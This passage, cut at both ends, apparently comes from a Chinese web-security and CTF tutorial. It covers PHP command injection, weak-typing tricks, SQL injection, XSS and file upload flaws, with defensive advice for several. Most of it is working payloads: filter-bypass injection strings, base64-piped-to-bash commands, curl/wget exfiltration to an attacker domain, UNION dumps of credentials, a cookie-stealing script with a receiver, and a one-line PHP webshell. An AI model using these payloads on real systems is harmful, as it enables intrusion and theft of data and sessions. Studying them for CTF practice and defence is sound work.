$output = shell_exec("ls -la");
echo $output;

// 反引号 `` 是 shell_exec() 的等价写法（注意是反引号`不是单引号'）
$output = `whoami`;
echo $output;
$output = `cat /etc/passwd`;
echo $output;
?>
```

**4. passthru() — 执行命令，直接输出原始结果（适合二进制数据）**
```php
<?php
// 和system()类似，直接输出结果
// 区别：适合输出二进制数据（比如图片）
passthru("ls -la");
passthru("cat /etc/passwd");
?>
```

**5. popen() / pclose() — 通过进程管道执行命令**
```php
<?php
// popen()打开进程管道，返回文件指针，可以像读写文件一样和进程交互
$handle = popen("ls -la", "r");  // "r"读模式
while (!feof($handle)) {
    echo fread($handle, 4096);
}
pclose($handle);
?>
```

**6. proc_open() — 更高级的进程控制**
```php
<?php
// 可以单独控制stdin/stdout/stderr三个流
$descriptors = [
    0 => ["pipe", "r"],  // 子进程标准输入
    1 => ["pipe", "w"],  // 子进程标准输出
    2 => ["pipe", "w"],  // 子进程标准错误
];
$process = proc_open("ls -la", $descriptors, $pipes);
$stdout = stream_get_contents($pipes[1]);
fclose($pipes[1]);
proc_close($process);
echo $stdout;
?>
```

**7. eval() — 最危险！把字符串作为PHP代码执行**
```php
<?php
// eval()不是执行系统命令，而是把字符串当作PHP代码执行！
// 如果用户能控制eval的参数，相当于能执行任意PHP代码

eval("phpinfo();");     // 执行phpinfo()
eval("echo 'hello';");  // 执行 echo 'hello'
eval("system('whoami');"); // 嵌套执行系统命令
// 可以通过eval写WebShell、读取文件、执行命令，危害极大
?>
```

**其他危险函数：**
```php
<?php
assert("phpinfo()");          // PHP 5.x/7.x中如果传入字符串会当作PHP代码执行
preg_replace("/.*/e", $_GET['cmd'], "");  // /e修饰符会把替换结果当作PHP代码执行（PHP 7已移除）
call_user_func("system", "whoami");       // 回调函数，调用system("whoami")
?>
```

#### 3.1.3 命令注入漏洞示例（经典ping功能）

**漏洞代码：**
```php
<?php
// ping.php — 模拟网站常用的在线ping功能
$ip = $_GET['ip'];              // 直接从URL获取用户输入的IP，没有任何过滤！
system("ping -c 4 " . $ip);    // 直接拼接到ping命令中执行！
?>
```

**正常访问：**
```
http://target/ping.php?ip=127.0.0.1
执行的命令：ping -c 4 127.0.0.1
结果：正常ping 4次，显示ping的结果
```

**命令注入攻击！！！**

系统命令可以用特殊符号连接多条命令。通过拼接这些连接符，我们可以在ping命令后注入任意命令。

**Linux下的命令连接符：**

| 连接符 | 作用 | 示例 | 结果 |
|--------|------|------|------|
| `;` | 分号，顺序执行，不管前一个成功失败都执行后一个 | `ping 127.0.0.1; whoami` | 先ping再whoami |
| `|` | 管道，前一个的输出作为后一个的输入，只显示后一个的输出 | `ping 127.0.0.1|whoami` | 只显示whoami结果 |
| `||` | 逻辑或，前一个**失败**才执行后一个 | `xxx||whoami` | xxx失败，执行whoami |
| `&&` | 逻辑与，前一个**成功**才执行后一个 | `ping 127.0.0.1&&whoami` | ping成功后执行whoami |
| `` ` ` `` | 反引号，命令替换，先执行反引号中的命令 | `ping `whoami`` | 先执行whoami，再ping结果 |
| `$( )` | 命令替换，和反引号一样 | `ping $(whoami)` | 先执行whoami再ping |

**攻击payload演示：**
```
1. 分号注入（最直接）：
http://target/ping.php?ip=127.0.0.1;cat /etc/passwd
执行命令：ping -c 4 127.0.0.1; cat /etc/passwd
结果：ping完后显示/etc/passwd文件内容（Linux用户账户信息）

2. 管道（只显示注入命令结果）：
http://target/ping.php?ip=127.0.0.1|whoami
执行：ping -c 4 127.0.0.1 | whoami
结果：直接显示当前用户名（因为管道只显示后一个命令输出，ping的输出被吞了）
这是CTF中最常用的，因为ping结果会干扰flag显示

3. 逻辑与&&（ping成功后执行）：
http://target/ping.php?ip=127.0.0.1&&whoami
ping成功（返回0），然后执行whoami
结果：显示ping结果 + whoami结果

4. 反引号命令替换：
http://target/ping.php?ip=`whoami`
执行：ping -c 4 [whoami的执行结果]
虽然ping可能失败，但whoami已经执行了

5. 读flag（CTF中常见）：
http://target/ping.php?ip=127.0.0.1|cat /flag
http://target/ping.php?ip=127.0.0.1;cat /flag
```

**Windows下的命令连接符：**
```
&   — 顺序执行两条命令（类似Linux的;）
&&  — 前一个成功才执行后一个
|   — 管道，前一个输出作为后一个输入
||  — 前一个失败才执行后一个

示例：
http://target/ping.php?ip=127.0.0.1&whoami
http://target/ping.php?ip=127.0.0.1|whoami
注意URL中&是参数分隔符，直接写&会被当成另一个参数，需要URL编码为%26：
http://target/ping.php?ip=127.0.0.1%26whoami
```

**命令执行常用命令（CTF/渗透中）：**
```
====== Linux系统 ======
whoami                → 当前用户名
id                    → 当前用户UID/GID/组信息
uname -a              → 内核版本、系统信息
cat /etc/passwd       → 系统用户列表
cat /etc/shadow       → 密码哈希（需要root）
cat /flag             → CTF中读flag
ls -la /              → 列出根目录
pwd                   → 当前工作目录
cat /etc/hosts        → 本地hosts解析
ifconfig / ip a       → 网络信息
netstat -tulnp        → 查看监听端口和进程
ps aux / ps -ef       → 查看运行进程
env                   → 环境变量（可能有密码）
find / -name "flag*" 2>/dev/null  → 全盘搜索flag文件
wget http://x.x.x.x/shell.txt -O shell.php  → 从自己服务器下载WebShell
curl http://x.x.x.x/shell.php > shell.php   → 同上

====== Windows系统 ======
whoami                → 当前用户名
ipconfig              → 网络信息
systeminfo            → 系统详细信息（补丁、版本等）
dir                   → 列目录
type flag.txt         → 读文件
net user              → 查看用户
netstat -ano          → 查看端口
tasklist              → 进程列表
```

#### 3.1.4 命令执行绕过技巧（CTF高频考点）

实际CTF题目或生产环境中，通常会对用户输入做过滤，比如过滤空格、过滤`cat`、过滤`flag`、过滤`;`等符号。我们需要绕过这些过滤。

**一、空格绕过（过滤了空格）**

```
方法1：${IFS} （Shell内置的字段分隔符变量，默认包含空格/Tab/换行）
cat${IFS}/etc/passwd
cat${IFS}/flag
# ${IFS}被Shell解析为空格，所以等价于cat /etc/passwd

方法2：$IFS$9 （$9是空位置参数，$IFS$9 = IFS后面跟空 = 空格）
cat$IFS$9/etc/passwd

方法3：花括号展开（Shell的brace expansion）
{cat,/etc/passwd}
{cat,/flag}
# {a,b,c}展开为a b c，逗号前面为空，即 cat 和 /etc/passwd 之间用空格分隔

方法4：输入重定向<（<不需要空格）
cat</etc/passwd
cat</flag
# 重定向符号<可以替代空格分隔命令和文件参数

方法5：Tab字符（URL编码%09）
cat%09/etc/passwd
# %09是Tab字符URL编码，也可以作为分隔符
# 在URL中直接打Tab可能不行，用%09
```

**二、关键字绕过（过滤了cat、flag等关键词）**

```
方法1：引号包裹（单引号或双引号，Shell中引号拼接不影响命令执行）
c'a't /etc/passwd           # 单引号包裹，Shell解析后就是cat
c"a"t /etc/passwd           # 双引号也行
c''at /etc/passwd           # 空引号也可以
c'a't /f'l'ag               # 同时绕过cat和flag

方法2：反斜杠转义（转义字符不改变原意）
c\at /etc/passwd            # c\at = cat
c\a\t /etc/passwd           # 转义多个也可以
c\at /fl\ag

方法3：通配符匹配（?匹配单个字符，*匹配任意字符）
/bin/c?t /etc/p?sswd        # ?匹配一个字符：c?t=cat, p?sswd=passwd
/bin/ca? /etc/pas???
cat /fla?                   # flag的g用?匹配
cat /fl*                    # *匹配任意字符（fl* = flag）
cat /f???                   # f后面3个字符 = flag
cat /etc/pas*               # passwd
ls /f*                      # 列出f开头的文件，看看flag叫什么名字

方法4：变量拼接
a=c;b=at;$a$b /etc/passwd   # c和at拼接成cat
a=fl;b=ag;cat /$a$b         # fl+ag=flag
a=ca;b=t;c=/fl;d=ag;$a$b $c$d  # cat /flag

方法5：base64编码绕过（关键字都被过滤了，直接编码命令）
# 思路：把要执行的命令base64编码，在目标机器上解码执行
echo Y2F0IC9mbGFn | base64 -d | bash
# Y2F0IC9mbGFn 是 cat /flag 的base64编码
# base64 -d 解码后通过管道传给bash执行
# 也可以用反引号：
`echo "Y2F0IC9mbGFn"|base64 -d`

# base64编码方法（自己电脑上先编码）：
# Linux: echo -n "cat /flag" | base64
# Python: python3 -c "import base64;print(base64.b64encode(b'cat /flag').decode())"
# 在线网站：https://www.base64encode.org/

方法6：Hex编码绕过
# 类似base64，用hex编码
echo 636174202f666c6167 | xxd -r -p | bash
# 636174202f666c6167 是 "cat /flag" 的hex编码
# xxd -r -p 将hex转回字符串
```

**三、无回显处理（盲命令执行）**
```
如果命令执行了但页面不显示结果（Blind RCE），需要用其他方式获取结果：

方法1：延时判断（类似SQL盲注，布尔盲注）
?ip=127.0.0.1; sleep 5
如果页面等待5秒才返回，说明命令执行成功！
可以用来逐字符猜flag：
?ip=127.0.0.1;if [ $(cat /flag|cut -c1) = 'f' ];then sleep 3;fi
如果第一个字符是f，页面延迟3秒返回

方法2：写文件到Web目录然后访问
?ip=127.0.0.1;cat /flag > /var/www/html/result.txt
然后浏览器访问 http://target/result.txt 看结果

方法3：外带数据（OOB - Out of Band）
把结果通过DNS或HTTP请求带到自己的服务器上：
curl http://你的域名/`whoami`
wget http://你的域名/$(cat /flag|base64)
ping -c 1 $(cat /flag).你的域名   # DNSLog方式
可以用Burp Collaborator、DNSLog.cn、Interactsh等平台接收外带数据
```

**四、绕过黑名单函数**
```
如果过滤了system，还可以用：
exec()、shell_exec()、passthru()、popen()、proc_open()、反引号``
还有eval()、assert()、preg_replace+/e等代码执行函数
```

#### 3.1.5 命令执行漏洞防御

```php
<?php
$ip = $_GET['ip'];

// ❌ 黑名单过滤（非常不推荐！黑名单总有绕过方式）
// $ip = str_replace(";", "", $ip);  // 过滤了分号，但还有|、&&、||
// $ip = str_replace("cat", "", $ip); // 过滤cat，但可以用tac/more/ca\t/c'a't
// 不要依赖黑名单！

// ✅ 方法1：白名单验证（最安全！）
// 如果期望的是IP地址，就严格验证是IP格式
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}
// 或者正则严格匹配IP
if (!preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $ip)) {
    die("Invalid IP");
}
// 验证过是合法IP后才能执行命令
system("ping -c 4 " . $ip);

// ✅ 方法2：escapeshellarg() 转义参数（让输入作为一个整体参数）
// escapeshellarg()会给字符串加上单引号，并转义字符串中的单引号
// 确保整个字符串被当作一个参数，不会被注入额外命令
$ip = escapeshellarg($ip);
system("ping -c 4 " . $ip);
// 例如输入 127.0.0.1;cat /etc/passwd 会被转义为 '127.0.0.1;cat /etc/passwd'
// 整个字符串在单引号内，分号只是普通字符，不会被当作命令分隔符

// ✅ 方法3：escapeshellcmd() 转义整个命令中的特殊字符
// escapeshellcmd()会转义Shell元字符：#&;`|*?~<>^()[]{}$\ 等
$cmd = escapeshellcmd("ping -c 4 " . $ip);
system($cmd);
// 注意：escapeshellarg是转义参数，escapeshellcmd是转义命令，作用不同！

// ✅ 方法4：尽量不要调用系统命令
// PHP有很多内置函数可以替代系统命令
// 比如用PHP的网络相关函数替代ping、用文件操作函数替代cat等

// ✅ 服务器层面加固：
// 1. PHP配置中禁用危险函数（php.ini）：
// disable_functions = system,exec,shell_exec,passthru,popen,proc_open,eval,assert
// 2. PHP用open_basedir限制只能访问网站目录
// 3. Web服务进程用低权限用户运行（不要用root/Administrator）
// 4. 部署WAF拦截恶意请求
?>
```

---

### 3.2 PHP黑魔法（弱类型漏洞）

PHP黑魔法是指PHP弱类型设计和函数实现中的各种"坑"，CTF中极其常见。

#### 3.2.1 PHP弱类型比较（核心！）

```php
<?php
// PHP两种比较：
// == （松散比较/弱比较）：比较前自动做类型转换，只比较值
// ===（严格比较/强比较）：先比较类型，类型不同直接false，类型相同再比较值
```

**PHP弱类型比较的核心规则：**
```
1. 字符串和数字比较时，字符串会自动转为数字
2. "开头是数字"的字符串：取开头数字部分转换（"123abc" → 123）
3. "开头不是数字"的字符串：转成0（"abc" → 0）
4. "0e..."开头的字符串：被解析为科学计数法（0 * 10^xxx = 0）
5. 布尔值和其他比较：很多值转布尔是false（0、""、null、空数组、"0"）
```

**弱比较True/False对照表（务必记住！）：**

| 比较 | 结果 | 原因 |
|------|------|------|
| `"0" == 0` | true | 字符串"0"转数字是0 |
| `"" == 0` | true | 空字符串转数字是0 |
| `"1abc" == 1` | **true（PHP 7.x）** | 取开头数字1，后面忽略（PHP 8已修复） |
| `"abc" == 0` | true | 开头无数字转成0 |
| `"0e123" == 0` | true | 科学计数法：0*10^123=0 |
| `"0e456" == "0e789"` | **true** | 都是0的科学计数法，都等于0 |
| `0 == null` | true | null转数字是0 |
| `"" == null` | true | 空字符串和null相等 |
| `false == null` | true | false和null相等 |
| `"0" == false` | true | "0"转布尔是false |
| `"" == false` | true | 空字符串转布尔是false |
| `"admin" == 0` | true | "admin"开头无数字，转数字0 |
| `[] == false` | true | 空数组转布尔是false |

**注意：PHP 8.0做了很多修正，但CTF题目仍大量使用PHP 5.x/7.x，这些技巧仍然有效！**

#### 3.2.2 md5()/sha1() 哈希绕过（CTF最常考）

**漏洞1：0e开头哈希碰撞（==弱比较时）**
```php
<?php
// md5()返回32位十六进制哈希字符串
// 如果两个不同字符串的md5值都是"0e"开头（科学计数法格式），
// 用==弱比较时会被当作0*10^xxx，都是0，所以相等！

// 经典碰撞对（记住几个！）：
echo md5("240610708");  // 0e462097431906509019562988736854
echo md5("QNKCDZO");    // 0e830400451993494058024219903391
var_dump(md5("240610708") == md5("QNKCDZO"));  // bool(true)！！

// 更多MD5碰撞值（0e开头）：
$s1 = "s878926199a";  // md5: 0e545993274517709034328855841020
$s2 = "s155964671a";  // md5: 0e342768416822451524974117254469
var_dump(md5($s1) == md5($s2));  // true

// SHA1也有同样问题
echo sha1("aaroZmOk"); // 0e6650701996942713489456749430518556633
echo sha1("aaK1STfY"); // 0e7665852665575620768827115962402601139
var_dump(sha1("aaroZmOk") == sha1("aaK1STfY"));  // true
?>
```

**常用MD5碰撞值（CTF必备，背下来）：**
```
QNKCDZO         → 0e830400451993494058024219903391
240610708       → 0e462097431906509019562988736854
s878926199a     → 0e545993274517709034328855841020
s155964671a     → 0e342768416822451524974117254469
s214587387a     → 0e848240448830537924465865611904
s1091221200a    → 0e940624217856561557816327384675
s1885207154a    → 0e509367213418206700842008763514
```

**漏洞2：数组绕过（md5/sha1不处理数组）**
```php
<?php
// md5()和sha1()期望传入字符串！如果传入数组会返回NULL（PHP 7.x）

$a = ["1"];
$b = ["2"];
var_dump(md5($a));      // NULL（PHP 7.x）；PHP 8会报错
var_dump(md5($b));      // NULL
var_dump(md5($a) == md5($b));   // true！NULL == NULL
var_dump(md5($a) === md5($b));  // true！ NULL === NULL

// CTF题目：
// if ($a != $b && md5($a) == md5($b)) echo "flag";
// 绕过：?a[]=1&b[]=2
// $a=[1], $b=[2]，$a != $b（数组内容不同），但md5都返回NULL，相等！
// 这个绕过对==和===都有效！
?>
```

**CTF MD5题解法总结：**
```php
// 题目类型1（弱比较==）：
if ($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])) {
    echo $flag;
}
// 解法A：0e碰撞 → ?a=QNKCDZO&b=240610708
// 解法B：数组绕过 → ?a[]=1&b[]=2

// 题目类型2（强比较===）：
if ($_GET['a'] !== $_GET['b'] && md5($_GET['a']) === md5($_GET['b'])) {
    echo $flag;
}
// 0e碰撞不行了（强比较会比较整个字符串）
// 解法A：数组绕过 → ?a[]=1&b[]=2 （都返回NULL，NULL===NULL为true）
// 解法B：MD5构造碰撞（真正的密码学碰撞，两个不同二进制数据MD5完全相同）
//       需要特殊构造的二进制数据，需要POST原始数据（不是GET）
```

#### 3.2.3 strcmp()/strcasecmp() 绕过

```php
<?php
// strcmp(str1, str2) 比较两个字符串，返回：
// <0 如果str1 < str2
// 0  如果str1 == str2
// >0 如果str1 > str2

// 漏洞：strcmp期望字符串参数，传入数组会返回NULL！
$pwd = ["admin"];
$result = strcmp($pwd, "admin");
var_dump($result);   // NULL（PHP 7.x）

// NULL用==比较时等于0！
if (strcmp($_GET['pwd'], "admin") == 0) {
    echo "登录成功！";
}
// 绕过：?pwd[]=任意内容
// strcmp返回NULL，NULL == 0 → true，绕过验证登录成功！

// strcasecmp()是不区分大小写的版本，同样存在数组漏洞
?>
```

#### 3.2.4 intval()/is_numeric() 函数漏洞

```php
<?php
// intval()获取变量的整数值
var_dump(intval("123"));      // int(123)
var_dump(intval("123abc"));   // int(123)  从开头取数字，非数字截断
var_dump(intval("abc123"));   // int(0)    开头无数字→0
var_dump(intval("1e2"));      // int(1)    注意！intval不识别科学计数法！
var_dump(floatval("1e2"));    // float(100) floatval识别1e2=100！
var_dump(intval(1.9));        // int(1)    小数直接截断，不四舍五入
var_dump(intval(true));       // int(1)
var_dump(intval(false));      // int(0)
var_dump(intval(null));       // int(0)

// is_numeric()判断是否是数字或数字字符串
var_dump(is_numeric("123"));      // true
var_dump(is_numeric("12.3"));     // true
var_dump(is_numeric("1e2"));      // true ← 注意！is_numeric识别科学计数法！
var_dump(is_numeric("0x1A"));     // false（PHP 7+）；PHP 5识别为true
var_dump(is_numeric(" 123"));     // true（首尾空格忽略）
// 这导致一个绕过：0e开头的字符串可以绕过is_numeric检查
// 同时在md5弱比较中能绕过 == 比较
?>
```

#### 3.2.5 switch() 弱比较

```php
<?php
// switch中的case比较用的是==弱比较！
$num = "1abc";
switch ($num) {
    case 0:
        echo "case 0";
        break;
    case 1:
        echo "case 1";  // PHP 7.x中会输出这里！因为"1abc"==1是true
        break;
    case 2:
        echo "case 2";
        break;
    default:
        echo "default";
}

// 经典陷阱：
$x = "admin";
switch ($x) {
    case 0:
        echo "case 0";   // 会输出这个！因为"admin"==0为true！
        break;           // 字符串"admin"开头没有数字，转数字0，匹配case 0
    case "admin":
        echo "case admin";
        break;
}
// switch是按case顺序匹配，匹配到第一个就break，所以case 0先匹配到了
?>
```

#### 3.2.6 in_array()/array_search() 默认弱比较

```php
<?php
// in_array(needle, haystack, strict) 检查值是否在数组中
// strict参数：true是严格比较(===)，false默认是弱比较(==)！

$whitelist = [0, 1, 2, 3];
$input = "1abc";

if (in_array($input, $whitelist)) {
    echo "通过白名单";   // 会输出！因为"1abc"==1 → true
}

// 如果攻击者传入"0abc"或字符串"0"呢？
// 绕过数字白名单！

// 正确做法：第三个参数传true，使用严格比较
if (in_array($input, $whitelist, true)) {
    echo "安全通过";
}

// array_search()同理，默认也是弱比较
$key = array_search("1abc", [0, 1, 2]);
var_dump($key);  // int(1) 找到了！"1abc"==1在索引1处
?>
```

#### 3.2.7 preg_match() 绕过

```php
<?php
// preg_match(正则, 字符串)执行正则匹配
// 返回1=匹配到，0=没匹配到，false=错误

// 漏洞1：传入数组返回false
$pattern = "/^[a-zA-Z]+$/";  // 只允许字母
$input = ["abc"];            // 传入数组
var_dump(preg_match($pattern, $input));  // bool(false)

// 如果程序逻辑：
if (preg_match("/[0-9]/", $_GET['c'])) {
    die("不能包含数字！");
}
// 传入 ?c[]=abc123，preg_match不处理数组返回false，绕过检测！
// 程序认为false就是"没匹配到数字"，实际是出错了

// 漏洞2：NULL字节截断（PHP < 7.0）
// %00（\x00）是C字符串结束符，PHP旧版本的正则在遇到%00时会认为字符串结束
$input = "abc\x00123";  // URL编码：abc%00123
if (preg_match("/^abc$/", $input)) {
    echo "匹配成功";  // PHP < 7.0中会输出！因为\x00截断后只比较了"abc"
}
?>
```

---

### 3.3 经典CTF题目复盘

#### 题目1：命令执行（flag关键字过滤）
```php
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (preg_match('/flag/i', $cmd)) {  // 不区分大小写过滤flag
        die("Hacker!");
    }
    system($cmd);
}
?>
```
解法：
```
方法1：通配符绕过
?cmd=cat /f?ag          # ?匹配单个字符：f?ag = flag
?cmd=cat /fla*         # *匹配任意字符
?cmd=cat /f[a]ag       # []字符集匹配[a]=a

方法2：引号绕过
?cmd=c'a't /f'l'ag
?cmd=c"a"t /f"l"ag

方法3：反斜杠转义
?cmd=c\at /f\lag

方法4：先看目录结构
?cmd=ls /              # 看看根目录有什么文件
?cmd=ls -la /

方法5：base64编码
?cmd=echo Y2F0IC9mbGFn|base64 -d|bash
# Y2F0IC9mbGFn = "cat /flag" 的base64
```

#### 题目2：MD5弱比较
```php
<?php
if (isset($_GET['a']) && isset($_GET['b'])) {
    if ($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])) {
        echo "Flag: {xxx}";
    }
}
?>
```
解法：
```
方法1：0e碰撞
?a=QNKCDZO&b=240610708

方法2：数组绕过
?a[]=1&b[]=2
```

#### 题目3：strcmp绕过
```php
<?php
if (isset($_GET['password'])) {
    if (strcmp($_GET['password'], "admin123") == 0) {
        echo "Flag: {xxx}";
    }
}
?>
```
解法：
```
?password[]=x
传入数组让strcmp返回NULL，NULL==0为true绕过验证。
```

---

### 3.4 SQL注入漏洞基础（入门）

SQL注入是最经典、最常见的Web漏洞之一，也是新手入门Web安全的第一个漏洞。

#### 3.4.1 漏洞原理

```
产生原因：
程序员在编写代码时，直接将用户输入拼接到SQL语句中，没有做任何过滤或预编译处理。
攻击者通过构造特殊输入，改变SQL语句的原有逻辑，从而执行任意SQL操作（查询、修改、删除数据）。

核心思想：用户输入被当作SQL代码执行了！
```

**漏洞代码示例（PHP+MySQL）：**
```php
<?php
// 接收URL参数id，例如：http://target/news.php?id=1
$id = $_GET['id'];

// 直接拼接SQL语句！！！没有任何过滤！
// 正常期望执行的SQL：SELECT * FROM news WHERE id = 1
$sql = "SELECT * FROM news WHERE id = " . $id;

// 执行SQL
$result = mysql_query($sql);

// 输出结果
while ($row = mysql_fetch_assoc($result)) {
    echo "标题：" . $row['title'] . "<br>";
}
?>
```

#### 3.4.2 注入攻击演示

**正常访问：**
```
http://target/news.php?id=1
执行SQL：SELECT * FROM news WHERE id = 1
结果：正常显示id=1的新闻
```

**判断是否存在注入点（最基础测试）：**
```
测试1：加单引号（经典测试）
http://target/news.php?id=1'
SQL变成：SELECT * FROM news WHERE id = 1'
如果页面报错（MySQL语法错误），说明单引号被带入SQL执行了，很可能存在注入！
常见报错：You have an error in your SQL syntax...

测试2：and 1=1 / and 1=2（布尔测试）
http://target/news.php?id=1 and 1=1
SQL：SELECT * FROM news WHERE id = 1 and 1=1（永远为真）→ 页面正常显示

http://target/news.php?id=1 and 1=2
SQL：SELECT * FROM news WHERE id = 1 and 1=2（永远为假）→ 页面无数据/报错
两个页面表现不同 → 存在注入！

测试3：加减测试
http://target/news.php?id=2-1
SQL：SELECT * FROM news WHERE id = 2-1 → 即 id=1
如果显示和id=1相同的新闻，说明减法被SQL执行了 → 存在注入
```

**UNION联合查询注入（最常用入门方式）：**
```
原理：UNION可以将多个SELECT语句的结果合并。
我们可以构造UNION查询，把我们想要的数据（如账号密码）查出来。

步骤1：确定列数（ORDER BY或UNION SELECT测试）
http://target/news.php?id=1 order by 1     # 正常
http://target/news.php?id=1 order by 2     # 正常
http://target/news.php?id=1 order by 3     # 正常
http://target/news.php?id=1 order by 4     # 报错（Unknown column）
→ 说明有3列（查询的表有3个字段）

或者直接测试：
http://target/news.php?id=1 union select 1,2,3
如果不报错，且页面显示了1、2、3中的某些数字，说明列数是3，且显示位是对应数字位置。

步骤2：获取数据库信息
http://target/news.php?id=-1 union select 1,database(),3
# database()函数返回当前数据库名，注意id=-1（让原查询查不到数据，只显示我们union的结果）

http://target/news.php?id=-1 union select 1,version(),3
# version()返回MySQL版本，如5.7.26

http://target/news.php?id=-1 union select 1,user(),3
# user()返回当前数据库用户

步骤3：获取所有表名
http://target/news.php?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
# information_schema是MySQL自带的系统库，记录了所有库名、表名、列名
# group_concat()把多行结果合并成一行字符串

步骤4：获取列名
假设查到有个user表（或admin表、users表）：
http://target/news.php?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'

步骤5：获取账号密码
假设表名是users，列是id,username,password：
http://target/news.php?id=-1 union select 1,group_concat(username,0x3a,password),3 from users
# 0x3a是冒号:的十六进制
```

**字符型注入（有单引号包裹的情况）：**
```php
<?php
// 如果代码是这样（参数用单引号包裹）：
$sql = "SELECT * FROM news WHERE id = '" . $id . "'";
// 正常SQL：SELECT * FROM news WHERE id = '1'
?>
```
```
此时注入需要闭合单引号：
http://target/news.php?id=1' and 1=1 --+
SQL：SELECT * FROM news WHERE id = '1' and 1=1 -- '
-- 是SQL注释符（--后面要有空格，URL中--+或--%20），把后面的单引号注释掉

http://target/news.php?id=-1' union select 1,database(),3 --+
```

**常用SQL注入函数和语句：**
```
database()           当前数据库名
version()            MySQL版本
user()               当前用户
@@datadir            数据库数据目录
@@version_compile_os 操作系统
group_concat()       合并多行结果为一行
limit 0,1            取第一行（第一行是0）
hex()                转为十六进制（避免乱码）
load_file('/etc/passwd')  读取服务器文件（需要高权限）
into outfile '/var/www/html/shell.php'  写文件到服务器（写WebShell）
information_schema.tables    所有表信息
information_schema.columns   所有列信息
information_schema.schemata  所有数据库名
```

**SQL注入防御（简单了解）：**
```php
<?php
// 1. 使用预编译语句（PDO，最推荐！）
$pdo = new PDO("mysql:host=localhost;dbname=test", "root", "password");
$stmt = $pdo->prepare("SELECT * FROM news WHERE id = ?");
$stmt->execute([$id]);  // 参数化查询，用户输入不会被当作SQL代码

// 2. 强制类型转换（数字型参数）
$id = intval($_GET['id']);  // 强制转成整数，不可能注入

// 3. 黑名单转义（不推荐，但比没有好）
$id = mysql_real_escape_string($id);  // 转义单引号等特殊字符
?>
```

---

### 3.5 XSS跨站脚本漏洞基础

#### 3.5.1 漏洞原理

```
XSS（Cross-Site Scripting，跨站脚本）是最常见的客户端漏洞。
产生原因：网站将用户输入的内容未经转义直接输出到HTML页面中。
攻击者可以注入恶意JavaScript代码，其他用户访问该页面时，恶意代码会在他们的浏览器中执行。

危害：
- 窃取用户Cookie（冒充用户登录）
- 钓鱼攻击（伪造登录框骗密码）
- 挂马（植入恶意软件）
- 键盘记录
- 篡改页面内容
- 发起CSRF请求操作用户账户
```

**XSS三种类型：**
```
1. 反射型XSS（非持久型）
   - 恶意代码在URL参数中，需要诱导用户点击恶意链接才触发
   - 一次性，只对点击链接的人有效
   - 例如搜索框、跳转页面

2. 存储型XSS（持久型）
   - 恶意代码被存储到服务器数据库中（如留言板、评论、博客文章、昵称）
   - 所有访问该页面的用户都会触发！危害最大
   - 不需要诱导点击，只要正常浏览就中招

3. DOM型XSS
   - 纯前端漏洞，恶意代码不经过服务器，直接在浏览器端通过DOM操作注入
   - 例如前端JS从URL取参数直接写入innerHTML
```

#### 3.5.2 XSS基本payload

```
最基础测试（弹窗测试）：
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>  弹窗显示当前Cookie

如果<script>被过滤，有很多绕过方式：

标签绕过：
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<iframe onload=alert('XSS')>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>

事件绕过：
<a href="javascript:alert('XSS')">click</a>
<form action="javascript:alert('XSS)"><button>click</button></form>

大小写绕过（如果过滤了小写script）：
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=X OnErRoR=alert('XSS')>

编码绕过：
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
# HTML实体编码
```

**XSS获取Cookie实战：**
```
攻击者的恶意代码：
<script>new Image().src="http://攻击者服务器/recv.php?c="+document.cookie;</script>

或者：
<script>
fetch("http://攻击者服务器/steal?c=" + document.cookie);
</script>

攻击者服务器上的recv.php（接收Cookie）：
<?php
$cookie = $_GET['c'];
$file = fopen("cookies.txt", "a");
fwrite($file, $cookie . "\n");
fclose($file);
?>

当其他用户访问存在XSS的页面时，他们的Cookie会被发送到攻击者服务器！
攻击者拿到Cookie后，在浏览器中替换Cookie就能登录受害者账户。
```

**XSS防御：**
```
核心：对输出到HTML页面的用户输入进行HTML实体转义！
把特殊字符转义成HTML实体：
& → &amp;
< → &lt;
> → &gt;
" → &quot;
' → &#x27;

PHP中用htmlspecialchars()函数：
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

其他防御：
- Cookie设置HttpOnly（JS无法读取document.cookie）
- 设置Content-Security-Policy（CSP）限制脚本来源
- 前端使用.textContent而不是.innerHTML
```

---

### 3.6 文件上传漏洞基础

#### 3.6.1 漏洞原理

```
产生原因：
网站允许用户上传文件（头像、附件、图片等），但没有严格验证上传文件的类型和内容，
导致攻击者可以上传.php/.asp/.jsp等Web脚本文件（WebShell），
上传成功后访问该文件就能执行任意服务器端代码，直接控制网站服务器！

一句话WebShell（PHP）：
<?php @eval($_POST['cmd']); ?>
- @ 表示出错不警告
- eval() 把字符串当作PHP代码执行
- $_POST['cmd'] 接收POST参数cmd，cmd参数的值就是要执行的代码
- 菜刀、蚁剑、冰蝎等工具可以连接这种WebShell管理服务器
```

**常见绕过方式：**
```
1. 前端JS验证绕过
   - 前端JS只检查文件后缀，可以Burp抓包改后缀
   - 或者先传合法图片后缀（如.jpg），抓包改成.php

2. MIME类型绕过
   - 服务器检查Content-Type是否为image/jpeg等图片类型
   - Burp抓包修改Content-Type: image/jpeg即可

3. 文件后缀黑名单绕过
   - 黑名单过滤了.php，可以用.php3、.php5、.phtml、.pht等
   - Windows特性：.php.（点结尾）、.php空格、.php::$DATA（NTFS流）
   - 大小写绕过：.PhP、.PHP

4. .htaccess攻击
   - 上传.htaccess文件，内容：AddType application/x-httpd-php .jpg
   - 这样所有.jpg文件都会被当作PHP执行
   - 然后上传后缀为.jpg的WebShell

5. 图片马制作（文件头检测绕过）
   - 服务器检查文件头是否为图片（GIF89a、PNG签名等）
   - 在图片末尾插入PHP代码：
     copy normal.gif/b + shell.php shell.gif
   - 然后配合文件包含漏洞（LFI）包含这个图片马执行代码

6. %00截断（PHP < 5.3.4）
   - 上传文件名为shell.php%00.jpg
